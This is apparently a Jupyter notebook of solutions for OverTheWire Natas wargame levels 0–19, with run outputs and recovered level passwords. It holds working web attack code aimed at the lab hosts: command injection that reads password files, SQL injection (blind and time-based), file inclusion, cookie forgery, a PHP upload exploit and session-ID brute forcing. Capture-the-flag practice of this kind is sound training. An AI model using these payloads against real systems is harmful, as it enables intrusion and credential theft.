{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import yaml\n",
    "import re\n",
    "import base64\n",
    "import urllib.parse\n",
    "from IPython.display import clear_output\n",
    "import threading\n",
    "import time\n",
    "\n",
    "pwd = None\n",
    "count = 0\n",
    "ALPHANUMERIC_CHARACTERS = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"\n",
    "\n",
    "def get_pwd():\n",
    "    global pwd\n",
    "    with open('password.yml', 'r') as f:\n",
    "        pwd = yaml.safe_load(f)\n",
    "\n",
    "def save_pwd(id, pw):\n",
    "    global pwd\n",
    "    with open('password.yml', 'w') as f:\n",
    "        pwd[id] = pw\n",
    "        yaml.dump(pwd, f)\n",
    "\n",
    "def find_pwd(res):\n",
    "    global count\n",
    "    pattern = r'[\\w\\d]{32}'\n",
    "    mat = re.findall(pattern, res.text)\n",
    "    natas = f'natas{count}'\n",
    "    if mat:\n",
    "        for m in mat:\n",
    "            if m != pwd[natas]:\n",
    "                print(f'password found: f{m}')\n",
    "                save_pwd(f'natas{count + 1}', m)\n",
    "                return True\n",
    "    \n",
    "    print(f'password not found.')\n",
    "    print(res.text)\n",
    "    return False\n",
    "\n",
    "def run_task(task, count=5):\n",
    "    thread_list = []\n",
    "    for _ in range(count):\n",
    "        thread_list.append(threading.Thread(target=task))\n",
    "    for thread in thread_list:\n",
    "        thread.start()\n",
    "    for thread in thread_list:\n",
    "        thread.join()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas0\n",
    "count = 0\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fTguMNxKo1DSa1tujBLuZJnDUlCcUAPlI\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas1\n",
    "count = 1\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas2\n",
    "count = 2\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/files/users.txt'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fQryZXc2e0zahULdHrtHxzyYkj59kUxLQ\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas3\n",
    "count = 3\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/s3cr3t/users.txt'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f0n35PkggAPm2zbEpOU802c0x0Msn1ToK\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas4\n",
    "count = 4\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org'\n",
    "header = {'Referer': 'http://natas5.natas.labs.overthewire.org/'}\n",
    "res = requests.get(url, auth=(natas, pwd[natas]), headers=header)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f0RoJwHdSKWFTYR5WuiAewauSuNaBXned\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas5\n",
    "count = 5\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org'\n",
    "cookies = {'loggedin': '1'}\n",
    "res = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas6"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<?\n",
      "$secret = \"FOEIUWGHFEEUHOFUOIU\";\n",
      "?>\n",
      "\n",
      "password found: fbmg8SvU1LizuWjx3y7xkNERkHxGre0GS\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas6\n",
    "count = 6\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/includes/secret.inc'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "print(res.text)\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "data = {\"secret\": \"FOEIUWGHFEEUHOFUOIU\", \"submit\": \"submit\"}\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), data=data)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas7"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fxcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas7\n",
    "count = 7\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas8"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "secret: oubWYf2kBq\n",
      "password found: fZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas8\n",
    "count = 8\n",
    "\n",
    "encodedSecret = \"3d3d516343746d4d6d6c315669563362\"\n",
    "secret = base64.decodebytes(bytes.fromhex(encodedSecret)[::-1]).decode()\n",
    "print(f'secret: {secret}')\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "data = {'secret': secret, 'submit': 'submit'}\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), data=data)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas9"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: ft7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas9\n",
    "count = 9\n",
    "\n",
    "#1 dictionary.txt; find / -type d -name \"natas*\";\n",
    "#1 dictionary.txt; ls /etc/natas_webpass;\n",
    "#1 dictionary.txt; cat /etc/natas_webpass/natas10;\n",
    "needle = \"1 dictionary.txt; cat /etc/natas_webpass/natas10;\"\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php?needle={urllib.parse.quote(needle)}'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas10"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fUJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas10\n",
    "count = 10\n",
    "needle = \" -e '.' /etc/natas_webpass/* #\"\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php?needle={urllib.parse.quote(needle)}'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas11"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'data': 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D'}\n",
      "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=\n",
      "a: b'\\x1ef$\\x07\\n3\\'\\x0e\\x167 \\x00\\x17 uUG*8MIf5\\x08\\x06+;\\x00\\x17fmMF\"1\\t\\x03\"1M\\x18'\n",
      "b: b'{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}'\n",
      "key: [101, 68, 87, 111]\n",
      "cookie: [30, 102, 36, 7, 10, 51, 39, 14, 22, 55, 32, 0, 23, 32, 117, 85, 71, 61, 50, 28, 71, 104, 117, 13, 2, 39, 56, 3, 10, 54, 117, 85, 71, 103, 49, 9, 3, 34, 49, 9, 71, 57]\n",
      "{'data': 'HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5'}\n",
      "password found: fyZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas11\n",
    "count = 11\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "cookies = {}\n",
    "for cookie in res.cookies:\n",
    "    cookies[cookie.name] = cookie.value\n",
    "print(cookies)\n",
    "\n",
    "a = urllib.parse.unquote(cookies['data'])\n",
    "print(a)\n",
    "a = base64.b64decode(a)\n",
    "b = b'{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}'\n",
    "print(f'a: {a}')\n",
    "print(f'b: {b}')\n",
    "\n",
    "key = []\n",
    "for i in range(len(b)):\n",
    "    key += [b[i] ^ a[i]]\n",
    "key = key[:4]\n",
    "print(f'key: {key}')\n",
    "\n",
    "text = b'{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}'\n",
    "cookie = []\n",
    "for i in range(len(text)):\n",
    "    cookie += [text[i] ^ key[i % len(key)]]\n",
    "print(f\"cookie: {cookie}\")\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "cookies['data'] = base64.b64encode(bytes(cookie)).decode()\n",
    "print(cookies)\n",
    "res = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas12"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: ftrbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC\n"
     ]
    }
   ],
   "source": [
    "# natas12\n",
    "count = 12\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "files = {\"uploadedfile\": ('natas12.php', open('natas12.php', 'rb'), 'multipart/form-data')}\n",
    "data = {\"filename\": \"1.php\", \"submit\": \"submit\"}\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), files=files, data=data)\n",
    "\n",
    "pattern = r'upload\\/[\\w\\d]{10}\\.php'\n",
    "mat = re.findall(pattern, res.text)\n",
    "if mat:\n",
    "    url = f'http://natas{count}.natas.labs.overthewire.org/{mat[0]}'\n",
    "    res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "    find_pwd(res)\n",
    "else:\n",
    "    print('not found.')\n",
    "    print(res.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas13"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fz3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ\n"
     ]
    }
   ],
   "source": [
    "# natas13\n",
    "count = 13\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "files = {\"uploadedfile\": ('natas13.php', open('natas13.php', 'rb'), 'multipart/form-data')}\n",
    "data = {\"filename\": \"1.php\", \"submit\": \"submit\"}\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), files=files, data=data)\n",
    "\n",
    "pattern = r'upload\\/[\\w\\d]{10}\\.php'\n",
    "mat = re.findall(pattern, res.text)\n",
    "if mat:\n",
    "    url = f'http://natas{count}.natas.labs.overthewire.org/{mat[0]}'\n",
    "    res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "    find_pwd(res)\n",
    "else:\n",
    "    print('not found.')\n",
    "    print(res.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas14"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fSdqIqBsFcz3yotlNYErZSZwblkm0lrvx\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas14\n",
    "count = 14\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "username = 'natas15\";#'\n",
    "password = \"123\"\n",
    "url = f'http://{natas}.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(username)}&password={urllib.parse.quote(password)}&debug=0'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas15"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--------------------------------------------------\n",
      "current password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo\n",
      "--------------------------------------------------\n",
      "--------------------------------------------------\n",
      "password found: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo\n",
      "--------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "# natas15\n",
    "count = 15\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "\n",
    "def try_inject(username):\n",
    "    url = f\"http://{natas}.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(username)}&debug=0\"\n",
    "    result = requests.get(url, auth=(natas, pwd[natas])).text\n",
    "    return \"This user exists.\" in result\n",
    "\n",
    "username = 'natas16\" and BINARY password like \"'\n",
    "password = \"\"\n",
    "\n",
    "current_char_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "def task():\n",
    "    global current_char_list, password\n",
    "    while len(password) < 32:\n",
    "        c = current_char_list.pop()\n",
    "        print(f\"trying {password}{c}\")\n",
    "        if try_inject(f\"{username}{password}{c}%\"):\n",
    "            clear_output()\n",
    "            password += c\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {password}\")\n",
    "            print(\"-\" * 50)\n",
    "            current_char_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "run_task(task)\n",
    "\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {password}\")\n",
    "print(\"-\" * 50)\n",
    "save_pwd(\"natas16\", password)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas16"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "bhjkoqsvwCEFHJLNOT05789\n"
     ]
    }
   ],
   "source": [
    "#natas16\n",
    "count = 16\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "\n",
    "# get all characters in the password\n",
    "key_list = []\n",
    "for c in ALPHANUMERIC_CHARACTERS:\n",
    "    command = \"$(grep -oh {0} /etc/natas_webpass/natas17)\".format(c)\n",
    "    url = f\"http://{natas}.natas.labs.overthewire.org/index.php?needle={command}&submit=Search\"\n",
    "    response = requests.get(url, auth=(natas, pwd[natas]))\n",
    "    if len(response.text) != 461926:\n",
    "        print(c, len(response.text))\n",
    "        key_list.append(c)\n",
    "\n",
    "key_list = \"\".join(key_list)\n",
    "clear_output()\n",
    "print(key_list)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--------------------------------------------------\n",
      "current password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC\n",
      "--------------------------------------------------\n",
      "--------------------------------------------------\n",
      "password found: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC\n",
      "--------------------------------------------------\n"
     ]
    },
    {
     "ename": "NameError",
     "evalue": "name 'password' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[3], line 29\u001b[0m\n\u001b[0;32m     27\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124mf\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mpassword found: \u001b[39m\u001b[38;5;132;01m{\u001b[39;00mkey\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m\"\u001b[39m)\n\u001b[0;32m     28\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m-\u001b[39m\u001b[38;5;124m\"\u001b[39m \u001b[38;5;241m*\u001b[39m \u001b[38;5;241m50\u001b[39m)\n\u001b[1;32m---> 29\u001b[0m save_pwd(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mnatas17\u001b[39m\u001b[38;5;124m\"\u001b[39m, \u001b[43mpassword\u001b[49m)\n",
      "\u001b[1;31mNameError\u001b[0m: name 'password' is not defined"
     ]
    }
   ],
   "source": [
    "# get all characters in the password\n",
    "key = \"\"\n",
    "current_key_list = [x for x in key_list]\n",
    "\n",
    "def task():\n",
    "    global key, current_key_list\n",
    "    while len(key) < 32:\n",
    "        if len(current_key_list) == 0:\n",
    "            return\n",
    "        c = current_key_list.pop()\n",
    "        new_key = key + c\n",
    "        print(f\"trying: {new_key}\")\n",
    "        command = \"$(grep -oh ^{0} /etc/natas_webpass/natas17)\".format(new_key)\n",
    "        url = f\"http://{natas}.natas.labs.overthewire.org/index.php?needle={command}&submit=Search\"\n",
    "        response = requests.get(url, auth=(natas, pwd[natas]))\n",
    "        if len(response.text) != 461926:\n",
    "            clear_output()\n",
    "            key = new_key\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {key}\")\n",
    "            print(\"-\" * 50)\n",
    "            current_key_list = [x for x in key_list]\n",
    "\n",
    "run_task(task)\n",
    "\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {key}\")\n",
    "print(\"-\" * 50)\n",
    "save_pwd(\"natas17\", key)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas17"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--------------------------------------------------\n",
      "current password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\n",
      "--------------------------------------------------\n",
      "Response time: 0.581000566482544\n",
      "Response time: 0.5825009346008301\n",
      "trying 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ9\n",
      "trying 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ8\n",
      "Response time: 0.5855011940002441\n",
      "Response time: 0.6174988746643066\n",
      "--------------------------------------------------\n",
      "password found: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\n",
      "--------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "#natas17\n",
    "count = 17\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "\n",
    "def try_inject(sql):\n",
    "    # print(sql)\n",
    "    t1 = time.time()\n",
    "    url = f\"http://natas17.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(sql)}&debug=0\"\n",
    "    result = requests.get(url, auth=(natas, pwd[natas])).text\n",
    "    t2 = time.time() - t1\n",
    "    print(f\"Response time: {t2}\")\n",
    "    if t2 > 5:\n",
    "        return True\n",
    "    else:\n",
    "        return False\n",
    "\n",
    "sql = \"natas18\\\" and BINARY password like \\\"{0}{1}%\\\" AND SLEEP(5)=0 #\"\n",
    "password = \"\"\n",
    "current_key_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "def task():\n",
    "    global password, current_key_list\n",
    "    while len(password) < 32:\n",
    "        if len(current_key_list) == 0:\n",
    "            time.sleep(6)\n",
    "            if len(current_key_list) == 0:\n",
    "                return\n",
    "        c = current_key_list.pop()\n",
    "        print(f\"trying {password}{c}\")\n",
    "        if try_inject(sql.format(password, c)):\n",
    "            clear_output()\n",
    "            password += c\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {password}\")\n",
    "            print(\"-\" * 50)\n",
    "            current_key_list = [x for x in ALPHANUMERIC_CHARACTERS]\n",
    "\n",
    "run_task(task)\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {password}\")\n",
    "print(\"-\" * 50)\n",
    "save_pwd(\"natas18\", password)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas18"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1051\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas18\", \"pass\": \"6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\" };</script></head>\n",
      "<body>\n",
      "<h1>natas18</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19\n",
      "Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "password found: ftnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr\n"
     ]
    }
   ],
   "source": [
    "#natas18\n",
    "count = 18\n",
    "\n",
    "get_pwd()\n",
    "del pwd['natas19']\n",
    "natas = f'natas{count}'\n",
    "\n",
    "url = f'http://natas18.natas.labs.overthewire.org/index.php?debug=1&username=admin&password=test'\n",
    "\n",
    "i = -1\n",
    "def task():\n",
    "    global i\n",
    "    while 'natas19' not in pwd:\n",
    "        i += 1\n",
    "        print(f'testing session id {i}')\n",
    "        cookies = dict(PHPSESSID=str(i))\n",
    "        result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "        if 'Username: natas19' in result.text:\n",
    "            clear_output()\n",
    "            print(len(result.text))\n",
    "            print(result.text)\n",
    "            find_pwd(result)\n",
    "            break\n",
    "\n",
    "run_task(task)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas19"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found. session id: 285, key: 3238312d61646d696e\n",
      "1097\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas19\", \"pass\": \"tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr\" };</script></head>\n",
      "<body>\n",
      "<h1>natas19</h1>\n",
      "<div id=\"content\">\n",
      "<p>\n",
      "<b>\n",
      "This page uses mostly the same code as the previous level, but session IDs are no longer sequential...\n",
      "</b>\n",
      "</p>\n",
      "DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20\n",
      "Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "password found: fp5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\n",
      "testing session id 285, key: 3238322d61646d696e\n",
      "testing session id 285, key: 3238332d61646d696e\n",
      "testing session id 285, key: 3238352d61646d696e\n",
      "testing session id 285, key: 3238342d61646d696e\n"
     ]
    }
   ],
   "source": [
    "#natas19\n",
    "count = 19\n",
    "\n",
    "get_pwd()\n",
    "del pwd['natas20']\n",
    "natas = f'natas{count}'\n",
    "\n",
